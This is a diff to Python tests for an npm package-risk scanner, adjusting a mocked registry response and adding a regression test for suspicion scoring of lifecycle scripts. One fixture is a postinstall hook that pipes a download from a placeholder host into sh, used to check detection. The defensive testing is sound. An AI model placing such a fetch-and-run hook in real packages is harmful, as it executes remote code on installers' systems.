@@ -63,6 +63,7 @@ def test_npm_enrichment_resolves_exact_version_and_inspects_new_lifecycle_releas
     ensure_collectors(db_path=db)
     package = "example-package"
     state = {"version": "1.0.0", "malicious": False}
+    published = {}  # a real packument lists every published version
 
     def fetch(url, max_bytes):
         if url.endswith(".tgz"):
@@ -81,11 +82,12 @@ def test_npm_enrichment_resolves_exact_version_and_inspects_new_lifecycle_releas
                 "author": {"name": "Example Maintainer"},
                 "dependencies": {},
             }
+            published[version] = item
             payload = {
                 "name": package,
                 "dist-tags": {"latest": version},
-                "time": {version: "2026-08-04T19:00:00.000Z"},
-                "versions": {version: item},
+                "time": {name: ("2026-08-04T19:00:00.000Z" if name == "1.0.0" else "2026-08-05T19:00:00.000Z") for name in published},
+                "versions": dict(published),
             }
             return 200, {"content-type": "application/json"}, json.dumps(payload).encode()
         raise AssertionError(url)
@@ -261,3 +263,26 @@ def test_static_triage_spends_downloads_on_the_most_suspicious_release(tmp_path,
     monkeypatch.setattr(enrichment, "collect_package_intake", lambda **kw: analysed.append(kw["package"]) or (_ for _ in ()).throw(RuntimeError("offline")))
     enrichment._run_static_triage(db_path=db, fetcher=SafeFetcher(fetch=lambda *_: (503, {}, b"")), limit=1)
     assert analysed == ["hooked-package"]
+
+
+def test_developer_scripts_and_first_observed_hooks_do_not_inflate_score():
+    # Regression from a live false positive: a first-observed release whose
+    # existing postinstall predates it, and "secret" appearing only in the
+    # test script, scored 100 (critical).
+    from secopsai.research_npm_enrichment import _suspicion_score, _version_summary
+
+    summary = _version_summary("0.62.1", {
+        "scripts": {"test": "node test/secrets.mjs && node test/token.mjs", "postinstall": "node postinstall.mjs"},
+        "bin": {"app": "index.mjs"},
+    }, {})
+    assert summary["script_risk_tokens"] == []
+    score, signals = _suspicion_score(summary, previous=None, baseline_only=True)
+    ids = {item["id"] for item in signals}
+    assert "new_lifecycle_hook" not in ids and "suspicious_lifecycle_name" not in ids
+    assert score < 40
+
+    hooked = _version_summary("1.0.1", {"scripts": {"postinstall": "curl https://x.invalid | sh"}}, {})
+    previous = _version_summary("1.0.0", {"scripts": {}}, {})
+    new_score, new_signals = _suspicion_score(hooked, previous=previous, baseline_only=False)
+    assert {"new_lifecycle_hook", "lifecycle_script_changed"} & {item["id"] for item in new_signals}
+    assert new_score >= 45
